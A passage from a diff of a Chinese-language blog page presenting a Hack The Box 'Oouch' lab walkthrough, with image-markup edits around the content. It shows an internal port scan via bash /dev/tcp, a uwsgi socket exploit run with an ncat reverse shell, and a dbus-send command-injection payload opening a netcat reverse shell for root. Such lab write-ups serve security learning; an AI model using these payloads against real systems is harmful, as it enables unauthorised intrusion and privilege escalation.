  valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens34: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:b9:ad:af brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.10.10.177/24 brd 10.10.10.255 scope global ens34</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 dead:beef::250:56ff:feb9:adaf/64 scope global dynamic mngtmpaddr</span><br><span class="line">       valid_lft 86195sec preferred_lft 14195sec</span><br><span class="line">    inet6 fe80::250:56ff:feb9:adaf/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default</span><br><span class="line">    link/ether 02:42:57:4d:fe:8d brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:a5:93:e9:a4 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:a5ff:fe93:e9a4/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">6: vethceecf07@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether 1a:6d:1b:fe:5e:6f brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet6 fe80::186d:1bff:fefe:5e6f/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">8: veth91c935d@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether aa:21:f6:24:9c:54 brd ff:ff:ff:ff:ff:ff link-netnsid 3</span><br><span class="line">    inet6 fe80::a821:f6ff:fe24:9c54/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: vethb848da6@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether 22:d2:ed:91:5d:e3 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::20d2:edff:fe91:5de3/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">12: veth039163f@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default</span><br><span class="line">    link/ether 6a:b9:9a:01:dd:04 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">    inet6 fe80::68b9:9aff:fe01:dd04/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
 
 <h1 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h1><p>直接探测22端口：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for IP in &#123;1..255&#125;; do</span><br><span class="line">  timeout 1 bash -c "&lt;/dev/tcp/172.17.0.$IP/22 &amp;&gt;/dev/null" &amp;&amp;  echo "IP $IP is open"</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071702.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>探测发现172.18.0.3开放(可能不同，比如参考资料是172.18.0.2，我打的时候是172.18.0.3)，直接用当前qtc用户私钥即可登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071701.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><p> 有个code目录，应该是前面5000和8000端口的web代码：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071703.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="dbus"><a href="#dbus" class="headerlink" title="dbus"></a>dbus</h2><p>外面有一个note ,里面有提示信息：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qtc@oouch:~$ cat .note.txt</span><br><span class="line">Implementing an IPS using DBus and iptables == Genius?</span><br></pre></td></tr></table></figure>
 
@@ -380,11 +564,25 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qtc@aeb4525789d8:/tmp$ ls -al</span><br><span class="line">total 2864</span><br><span class="line">drwxrwxrwt 1 root     root        4096 Jul 17 05:54 .</span><br><span class="line">drwxr-xr-x 1 root     root        4096 Feb 25 12:33 ..</span><br><span class="line">-rwxr-xr-x 1 qtc      qtc      2914424 Jul 17 05:52 ncat</span><br><span class="line">-rwxr-xr-x 1 qtc      qtc         4334 Jul 17 05:54 uswgi.py</span><br><span class="line">srw-rw-rw- 1 www-data www-data       0 Jul 17 04:35 uwsgi.socket</span><br><span class="line">qtc@aeb4525789d8:/tmp$ python uswgi.py -m unix -u /tmp/uwsgi.socket -c "/tmp/ncat -e /bin/bash 172.18.0.1 7777"</span><br></pre></td></tr></table></figure>
 
 <p>外面得到docker的www-root用户shell：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071704.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="dbus-exploit-get-root-flag"><a href="#dbus-exploit-get-root-flag" class="headerlink" title="dbus exploit get root flag"></a>dbus exploit get root flag</h1><p>然后再开一个监听，用www-root的shell执行dbus-send,得到root权限shell,读取root.txt：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbus-send --system --print-reply --dest&#x3D;htb.oouch.Block &#x2F;htb&#x2F;oouch&#x2F;Block  htb.oouch.Block.Block &quot;string:;rm &#x2F;tmp&#x2F;.0; mkfifo &#x2F;tmp&#x2F;.0; cat &#x2F;tmp&#x2F;.0 | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 172.18.0.1 7778 &gt;&#x2F;tmp&#x2F;.0;&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071705.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020071705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Attacking the OAuth Protocol - Dhaval Kapil<br><a href="https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/" target="_blank" rel="noopener">https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/</a></li>
 <li>webcgi-exploits/uwsgi-rce-zh.md at master · wofeiwo/webcgi-exploits<br><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md" target="_blank" rel="noopener">https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md</a></li>
